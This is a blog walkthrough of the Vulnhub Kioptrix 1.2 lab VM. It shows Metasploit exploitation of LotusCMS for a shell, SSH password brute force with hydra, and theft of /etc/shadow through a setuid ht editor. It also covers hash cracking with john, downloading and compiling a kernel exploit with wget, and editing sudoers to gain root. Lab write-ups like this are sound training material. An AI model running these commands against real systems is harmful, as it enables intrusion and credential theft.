@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.68.3" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || Vulnhub - Kioptrix 1.2 (#3)</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-10" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+</div>
+            </div>
+
+            <div class="columns is-centered">
+                <div class="column is-10" id="main-column">
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">Vulnhub - Kioptrix 1.2 (#3)</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="April 23, 2020">
+      Apr 23
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/pentest">pentest</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags"></a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <h1 id="finding-the-ip-of-the-vm">Finding the IP of the VM</h1>
+<p>Huh, this time I didn&rsquo;t have to do weird stuff to fix the network! Just changed the network adapter from <code>bridged</code> to <code>NAT</code>!</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:~$ sudo arp-scan 172.16.149.0/24
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:fd:2b:71, IPv4: 172.16.149.129
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+172.16.149.1	00:50:56:c0:00:08	VMware, Inc.
+172.16.149.2	00:50:56:fd:11:d0	VMware, Inc.
+172.16.149.132	00:0c:29:3e:dd:2b	VMware, Inc.
+172.16.149.254	00:50:56:fe:b1:9f	VMware, Inc.
+</code></pre></div><p>IP of the target is: <code>172.16.149.132</code> !</p>
+<p>We just have one tiny little thing to do before we can poke the VM, as indicated by the README :</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">Before playing the game, please modify your attacker&#39;s hosts file.
+&lt;ip&gt;	kioptrix3.com
+This challenge contains a Web Application.
+</code></pre></div><p>Append a line to  <code>/etc/hosts</code> on the kali box:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">172.16.149.132 kioptrix3.com
+</code></pre></div><h1 id="scanning-in-progress">Scanning In Progress</h1>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ sudo nmap -T4 -p- -A -oA nmap_tcp 172.16.149.132
+</code></pre></div><p>Well, at least there is not a bazillion services on this one&hellip;</p>
+<table>
+<thead>
+<tr>
+<th>port</th>
+<th>service</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>SSH OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</td>
+</tr>
+<tr>
+<td>80</td>
+<td>Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h1 id="22-ssh">22 SSH</h1>
+<p>The version of OpenSSH 4.7p1 might be vulnerable and have a predictable PRNG: <a href="https://www.exploit-db.com/exploits/5720">https://www.exploit-db.com/exploits/5720</a>.</p>
+<p>Let&rsquo;s keep that information in mind and move on to the web server now. We&rsquo;ll come back here if we have nothing else on the web server.</p>
+<h1 id="80-apache-server">80 Apache server</h1>
+<p>Let&rsquo;s explore this website ~~</p>
+<p><a href="http://kioptrix3.com">http://kioptrix3.com</a></p>
+<p><img src="01_home.png" alt=""></p>
+<p><a href="http://kioptrix3.com/index.php?system=Blog">http://kioptrix3.com/index.php?system=Blog</a></p>
+<p><img src="02_blog.png" alt=""></p>
+<p><a href="http://kioptrix3.com/index.php?system=Admin">http://kioptrix3.com/index.php?system=Admin</a></p>
+<p><img src="03_admin.png" alt=""></p>
+<p><a href="http://kioptrix3.com/gallery">http://kioptrix3.com/gallery</a></p>
+<p><img src="04_gallery.png" alt=""></p>
+<p>Okay, so a couple of interesting stuff to look at here:</p>
+<ul>
+<li>the login page</li>
+<li>LotusCMS (the logo on the login page)</li>
+<li>the comment form on the blog page</li>
+</ul>
+<h2 id="lotuscms---first-shell">LotusCMS - First Shell</h2>
+<p>Sounds like LotusCMS is an interesting path, let&rsquo;s check if there is any available CVE&hellip;</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:~$ searchsploit lotusCMS
+--------------------------------------- ----------------------------------------
+ Exploit Title                         |  Path
+                                       | (/usr/share/exploitdb/)
+--------------------------------------- ----------------------------------------
+LotusCMS 3.0 - &#39;eval()&#39; Remote Command | exploits/php/remote/18565.rb
+LotusCMS 3.0.3 - Multiple Vulnerabilit | exploits/php/webapps/16982.txt
+--------------------------------------- ----------------------------------------
+</code></pre></div><ul>
+<li><a href="https://www.exploit-db.com/exploits/15964">https://www.exploit-db.com/exploits/15964</a> =&gt; LFI RCE</li>
+<li><a href="https://www.exploit-db.com/exploits/18565">https://www.exploit-db.com/exploits/18565</a> =&gt; RCE included in metasploit as <code>exploit/multi/http/lcms_php_exec</code></li>
+<li><a href="https://www.exploit-db.com/exploits/16982">https://www.exploit-db.com/exploits/16982</a> =&gt; uninteresting, stored XSS, XSS and CSRF</li>
+</ul>
+<p>CVE 18565 sounds like the most interesting for us, let&rsquo;s fire up metasploit then:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ msfconsole
+msf5 &gt; search lotusCMS
+
+Matching Modules
+================
+
+   #  Name                              Disclosure Date  Rank       Check  Description
+   -  ----                              ---------------  ----       -----  -----------
+   0  exploit/multi/http/lcms_php_exec  2011-03-03       excellent  Yes    LotusCMS 3.0 eval() Remote Command Execution
+
+
+msf5 &gt; use 0
+msf5 exploit(multi/http/lcms_php_exec) &gt; set RHOSTS 179.16.149.129
+RHOSTS =&gt; 179.16.149.129
+msf5 exploit(multi/http/lcms_php_exec) &gt; set URI http://kioptrix3.com/
+URI =&gt; http://kioptrix3.com/
+msf5 exploit(multi/http/lcms_php_exec) &gt; run
+
+[*] Started reverse TCP handler on 172.16.149.129:4444
+[*] Exploit completed, but no session was created.
+</code></pre></div><p>Huh, no session. Let&rsquo;s try a different URL maybe?</p>
+<ul>
+<li>set URI /index.php?page=index</li>
+<li>set URI <a href="http://kioptrix3.com/index.php?page=index">http://kioptrix3.com/index.php?page=index</a></li>
+<li>set URI <a href="http://kioptrix3.com">http://kioptrix3.com</a></li>
+</ul>
+<p>Still nothing, maybe the payload is too complicated ? After the exploit is selected, use <code>show payload</code> to display the payloads compatible with that specific exploit and pick another one.</p>
+<p>After half an hour trying all the payloads, the URI and studying the code of the exploit&hellip; Nothing was working&hellip;</p>
+<p>APPARENTLY I JUST HAVE PHAT FINGERS.</p>
+<p>I finally realized that I set the wrong IP in RHOSTS&hellip; Duh.</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 exploit(multi/http/lcms_php_exec) &gt; set RHOSTS 172.16.149.132
+RHOSTS =&gt; 172.16.149.132
+msf5 exploit(multi/http/lcms_php_exec) &gt; run
+
+[*] Using found page param: /index.php?page=index
+[*] Sending exploit ...
+[*] Started bind TCP handler against 172.16.149.132:4444
+[*] Command shell session 3 opened (172.16.149.129:42067 -&gt; 172.16.149.132:4444) at 2020-04-18 16:43:11 -0400
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+ls
+cache
+core
+data
+favicon.ico
+gallery
+gnu-lgpl.txt
+index.php
+modules
+style
+update.php
+
+uname -a
+Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
+
+cat /etc/*release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=8.04
+DISTRIB_CODENAME=hardy
+DISTRIB_DESCRIPTION=&#34;Ubuntu 8.04.3 LTS&#34;
+</code></pre></div><p>And we&rsquo;ve got a shell /o/  A weird one that cannot change directory though:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">pwd
+/home/www/kioptrix3.com
+cd /
+pwd
+/home/www/kioptrix3.com
+</code></pre></div><h2 id="kernel-exploitation">Kernel Exploitation</h2>
+<p>The kernel is a <code>2.6.24</code> which is vulnerable to a couple of kernel exploits like: <a href="https://github.com/lucyoa/kernel-exploits/tree/master/american-sign-language">https://github.com/lucyoa/kernel-exploits/tree/master/american-sign-language</a>.</p>
+<p>But it doesn&rsquo;t seem possible to download any exploit from the unprivileged shell:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">wget https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/american-sign-language/american-sign-language.c
+
+ls
+cache
+core
+data
+favicon.ico
+gallery
+gnu-lgpl.txt
+index.php
+modules
+style
+update.php
+</code></pre></div><p>No <code>american-sign-language.c</code> file here :(( Looks like a dead end, let&rsquo;s try something else&hellip;</p>
+<h2 id="poking-the-other-users">Poking the Other Users</h2>
+<p>Are we all alone on that machine?</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+dhcp:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/syslog:/bin/false
+klog:x:103:104::/home/klog:/bin/false
+mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash
+dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash
+</code></pre></div><p>Huhu, 2 users here: <code>loneferret</code> and <code>dreg</code>! Let&rsquo;s check their homes, surely they have secrets&hellip;</p>
+<p>The home of <code>dreg</code> is the definition of boring&hellip;</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ls -la /home/dreg
+total 20
+drwxr-xr-x 2 dreg dreg 4096 Apr 16  2011 .
+drwxr-xr-x 5 root root 4096 Apr 16  2011 ..
+-rw-r--r-- 1 dreg dreg  220 Apr 16  2011 .bash_logout
+-rw-r--r-- 1 dreg dreg 2940 Apr 16  2011 .bashrc
+-rw-r--r-- 1 dreg dreg  586 Apr 16  2011 .profile
+
+</code></pre></div><p>What about <code>loneferret</code>?</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">s -la /home/loneferret
+total 64
+drwxr-xr-x 3 loneferret loneferret  4096 Apr 17  2011 .
+drwxr-xr-x 5 root       root        4096 Apr 16  2011 ..
+-rw-r--r-- 1 loneferret users         13 Apr 18  2011 .bash_history
+-rw-r--r-- 1 loneferret loneferret   220 Apr 11  2011 .bash_logout
+-rw-r--r-- 1 loneferret loneferret  2940 Apr 11  2011 .bashrc
+-rw------- 1 root       root          15 Apr 15  2011 .nano_history
+-rw-r--r-- 1 loneferret loneferret   586 Apr 11  2011 .profile
+drwx------ 2 loneferret loneferret  4096 Apr 14  2011 .ssh
+-rw-r--r-- 1 loneferret loneferret     0 Apr 11  2011 .sudo_as_admin_successful
+-rw-r--r-- 1 root       root         224 Apr 16  2011 CompanyPolicy.README
+-rwxrwxr-x 1 root       root       26275 Jan 12  2011 checksec.sh
+
+</code></pre></div><p>A Company Policy, chic chic chic!</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">cat /home/loneferret/CompanyPolicy.README
+Hello new employee,
+It is company policy here to use our newly installed software for editing, creating and viewing files.
+Please use the command &#39;sudo ht&#39;.
+Failure to do so will result in you immediate termination.
+
+DG
+CEO
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">cat /home/loneferret/.bash_history
+sudo ht
+exit
+</code></pre></div><p>Huoh. A setuid binary huh? Interesting</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">which ht
+/usr/local/bin/ht
+ls -lah /usr/local/bin/ht
+-rwsr-sr-x 1 root root 2.0M Apr 16  2011 /usr/local/bin/ht
+file /usr/local/bin/ht
+/usr/local/bin/ht: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.6.8, dynamically linked (uses shared libs), not stripped
+
+</code></pre></div><p>Found in the output of <code>strings /usr/local/bin/ht</code>:</p>
+<ul>
+<li><a href="http://hte.sourceforge.net/">http://hte.sourceforge.net/</a></li>
+<li><code>This is HT 2.0.18;</code></li>
+</ul>
+<p>Okay, so that <code>loneferret</code> user can run <code>sudo ht</code>, which is an editor for executables, it&rsquo;s probably using the ncurses library to provide a CLI interface, which won&rsquo;t run in our broken shell&hellip; Is there another way to get access to the <code>loneferret</code> account though? Maybe that user has a well known password&hellip;</p>
+<h2 id="ssh-bruteforce---second-shell">SSH bruteforce - Second Shell</h2>
+<p>Let&rsquo;s run <code>hydra</code>  with the <code>rockyou.txt</code> wordlist to bruteforce the password on SSH:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ hydra -l loneferret -P /usr/share/wordlists/rockyou.txt -t 3 ssh://172.16.149.132
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-23 13:48:31
+[DATA] max 3 tasks per 1 server, overall 3 tasks, 14344399 login tries (l:1/p:14344399), ~4781467 tries per task
+[DATA] attacking ssh://172.16.149.132:22/
+[STATUS] 39.00 tries/min, 39 tries in 00:01h, 14344360 to do in 6130:05h, 3 active
+
+[STATUS] 26.67 tries/min, 80 tries in 00:03h, 14344319 to do in 8965:12h, 3 active
+
+
+[STATUS] 26.14 tries/min, 183 tries in 00:07h, 14344216 to do in 9144:46h, 3 active
+[STATUS] 25.33 tries/min, 380 tries in 00:15h, 14344019 to do in 9436:52h, 3 active
+[22][ssh] host: 172.16.149.132   login: loneferret   password: starwars
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-23 14:15:48
+</code></pre></div><p>And it&rsquo;s a match ! We&rsquo;ve got ssh credentials: <code>loneferret:starwars</code></p>
+<p>Let&rsquo;s try them:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:/mnt/hgfs/shared/kioptrix_3$ ssh loneferret@172.16.149.132
+loneferret@172.16.149.132&#39;s password: [starwars]
+Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
+loneferret@Kioptrix3:~$ ls -la
+total 64
+drwxr-xr-x 3 loneferret loneferret  4096 2011-04-17 08:59 .
+drwxr-xr-x 5 root       root        4096 2011-04-16 07:54 ..
+-rw-r--r-- 1 loneferret users         13 2011-04-18 11:44 .bash_history
+-rw-r--r-- 1 loneferret loneferret   220 2011-04-11 17:00 .bash_logout
+-rw-r--r-- 1 loneferret loneferret  2940 2011-04-11 17:00 .bashrc
+-rwxrwxr-x 1 root       root       26275 2011-01-12 10:45 checksec.sh
+-rw-r--r-- 1 root       root         224 2011-04-16 08:51 CompanyPolicy.README
+-rw------- 1 root       root          15 2011-04-15 21:21 .nano_history
+-rw-r--r-- 1 loneferret loneferret   586 2011-04-11 17:00 .profile
+drwx------ 2 loneferret loneferret  4096 2011-04-14 11:05 .ssh
+-rw-r--r-- 1 loneferret loneferret     0 2011-04-11 18:00 .sudo_as_admin_successful
+loneferret@Kioptrix3:~$
+</code></pre></div><p>Way better shell !</p>
+<h2 id="the-ht-editor">The ht Editor</h2>
+<p>Okay let&rsquo;s try running that <code>ht</code> editor:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">loneferret@Kioptrix3:~$ sudo ht --help
+Error opening terminal: xterm-256color.
+</code></pre></div><p>Oopsie, shell is too fancy:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">loneferret@Kioptrix3:~$ export TERM=xterm
+loneferret@Kioptrix3:~$ sudo ht --help
+</code></pre></div><p><img src="05_ht_help.png" alt=""></p>
+<p>That explains why even the <code>--help</code> wouldn&rsquo;t run from a less functional shell&hellip;</p>
+<p>After a bit of mucking around, I discover than <code>alt</code> is the key to prefix all shortcuts.</p>
+<p>I had high hopes for the <code>evaluate</code> command in the <code>Edit</code> menu. Buuuut, there is even better!</p>
+<p>First create a dummy file before running <code>sudo ht</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">loneferret@Kioptrix3:~$ touch shadow
+</code></pre></div><p>Then, in the <code>edit</code> menu, call:</p>
+<ul>
+<li><code>copy from file</code> fetch /etc/shadow</li>
+<li><code>paste into file</code>  <code>shadow</code> in loneferret&rsquo;s home</li>
+</ul>
+<p>And voilà, you&rsquo;ve got a copy of <code>/etc/shadow</code> that you can read:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">loneferret@Kioptrix3:~$ cat shadow
+root:$1$QAKvVJey$6rRkAMGKq1u62yfDaenUr1:15082:0:99999:7:::
+daemon:*:15075:0:99999:7:::
+bin:*:15075:0:99999:7:::
+sys:*:15075:0:99999:7:::
+sync:*:15075:0:99999:7:::
+games:*:15075:0:99999:7:::
+man:*:15075:0:99999:7:::
+lp:*:15075:0:99999:7:::
+mail:*:15075:0:99999:7:::
+news:*:15075:0:99999:7:::
+uucp:*:15075:0:99999:7:::
+proxy:*:15075:0:99999:7:::
+www-data:*:15075:0:99999:7:::
+backup:*:15075:0:99999:7:::
+list:*:15075:0:99999:7:::
+irc:*:15075:0:99999:7:::
+gnats:*:15075:0:99999:7:::
+nobody:*:15075:0:99999:7:::
+libuuid:!:15075:0:99999:7:::
+dhcp:*:15075:0:99999:7:::
+syslog:*:15075:0:99999:7:::
+klog:*:15075:0:99999:7:::
+mysql:!:15075:0:99999:7:::
+sshd:*:15075:0:99999:7:::
+loneferret:$1$qbkHf53U$r.kK/JgDLDcXGRC6xUfB11:15079:0:99999:7:::
+dreg:$1$qAc2saWZ$Y567sEs.ql3GMttI6pvoe0:15080:0:99999:7:::
+</code></pre></div><p>Let&rsquo;s try to break the root password, copy /etc/shadow and /etc/passwd in the same directory on the kali box:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:~$ unshadow -h
+Created directory: /home/kali/.john
+Usage: unshadow PASSWORD-FILE SHADOW-FILE
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:~$ unshadow passwd shadow &gt; passwords
+</code></pre></div><p>Okay, let&rsquo;s run jooohn:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:~$ john --wordlist=/usr/share/wordlists/rockyou.txt passwords
+Warning: detected hash type &#34;md5crypt&#34;, but the string is also recognized as &#34;md5crypt-long&#34;
+Use the &#34;--format=md5crypt-long&#34; option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 3 password hashes with 3 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+starwars         (loneferret)
+Mast3r           (dreg)
+kali@kali:~$ john --show passwords
+loneferret:starwars:1000:100:loneferret,,,:/home/loneferret:/bin/bash
+dreg:Mast3r:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash
+
+2 password hashes cracked, 1 left
+</code></pre></div><p>So we looted another user credentials: <code>dreg:Mast3r</code>! But we still haven&rsquo;t found root&rsquo;s password.</p>
+<p>Let&rsquo;s try the kernel exploit again maybe:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">loneferret@Kioptrix3:~$ cd /tmp
+loneferret@Kioptrix3:/tmp$ wget --no-check-certificate https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/american-sign-language/american-sign-language.c
+loneferret@Kioptrix3:/tmp$ gcc american-sign-language.c -o american-sign-language
+american-sign-language.c: In function ‘main’:
+american-sign-language.c:220: warning: integer constant is too large for ‘long’ type
+american-sign-language.c:253:2: warning: no newline at end of file
+loneferret@Kioptrix3:/tmp$ chmod +x american-sign-language
+loneferret@Kioptrix3:/tmp$ ./american-sign-language
+[+] resolving required symbols...
+[-] prepare_kernel_cred symbol not found, aborting!
+</code></pre></div><p>Still nope.</p>
+<h2 id="privesc">Privesc</h2>
+<p>What about sudo?</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">loneferret@Kioptrix3:~$ sudo -l
+User loneferret may run the following commands on this host:
+    (root) NOPASSWD: !/usr/bin/su
+    (root) NOPASSWD: /usr/local/bin/ht
+loneferret@Kioptrix3:~$ su
+Password:
+su: Authentication failure
+loneferret@Kioptrix3:~$ sudo -i
+[sudo] password for loneferret:
+Sorry, user loneferret is not allowed to execute &#39;/bin/bash&#39; as root on Kioptrix3.
+</code></pre></div><p>Okay, let&rsquo;s fix that! Run ht in text mode and edit the sudoers file like so:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">loneferret@Kioptrix3:~$ sudo ht -t /etc/sudoers
+</code></pre></div><p><img src="06_ht_sudoers.png" alt=""></p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">loneferret@Kioptrix3:~$ sudo -i
+root@Kioptrix3:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div><p>we got it /o/</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">root@Kioptrix3:~# ls
+Congrats.txt  ht-2.0.18
+root@Kioptrix3:~# cat Congrats.txt
+Good for you for getting here.
+Regardless of the matter (staying within the spirit of the game of course)
+you got here, congratulations are in order. Wasn&#39;t that bad now was it.
+
+Went in a different direction with this VM. Exploit based challenges are
+nice. Helps workout that information gathering part, but sometimes we
+need to get our hands dirty in other things as well.
+Again, these VMs are beginner and not intented for everyone.
+Difficulty is relative, keep that in mind.
+
+The object is to learn, do some research and have a little (legal)
+fun in the process.
+
+
+I hope you enjoyed this third challenge.
+
+Steven McElrea
+aka loneferret
+http://www.kioptrix.com
+
+
+Credit needs to be given to the creators of the gallery webapp and CMS used
+for the building of the Kioptrix VM3 site.
+
+Main page CMS:
+http://www.lotuscms.org
+
+Gallery application:
+Gallarific 2.1 - Free Version released October 10, 2009
+http://www.gallarific.com
+Vulnerable version of this application can be downloaded
+from the Exploit-DB website:
+http://www.exploit-db.com/exploits/15891/
+
+The HT Editor can be found here:
+http://hte.sourceforge.net/downloads.html
+And the vulnerable version on Exploit-DB here:
+http://www.exploit-db.com/exploits/17083/
+
+
+Also, all pictures were taken from Google Images, so being part of the
+public domain I used them.
+</code></pre></div><p>Takeaways:</p>
+<ul>
+<li>If your exploit doesn&rsquo;t work, triple check that RHOST is correct.</li>
+<li>Don&rsquo;t run text editors as setuid root binaries :)))</li>
+</ul>
+<p><img src="cat_bag.gif" alt=""></p>
+
+        </div>
+    </article>
+</div>
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#finding-the-ip-of-the-vm">Finding the IP of the VM</a></li>
+    <li><a href="#scanning-in-progress">Scanning In Progress</a></li>
+    <li><a href="#22-ssh">22 SSH</a></li>
+    <li><a href="#80-apache-server">80 Apache server</a>
+      <ul>
+        <li><a href="#lotuscms---first-shell">LotusCMS - First Shell</a></li>
+        <li><a href="#kernel-exploitation">Kernel Exploitation</a></li>
+        <li><a href="#poking-the-other-users">Poking the Other Users</a></li>
+        <li><a href="#ssh-bruteforce---second-shell">SSH bruteforce - Second Shell</a></li>
+        <li><a href="#the-ht-editor">The ht Editor</a></li>
+        <li><a href="#privesc">Privesc</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+    Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma, with lots of
+    
+        <a href="https://shiny-labs.re/credits/">awesome tools</a>.
+    
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
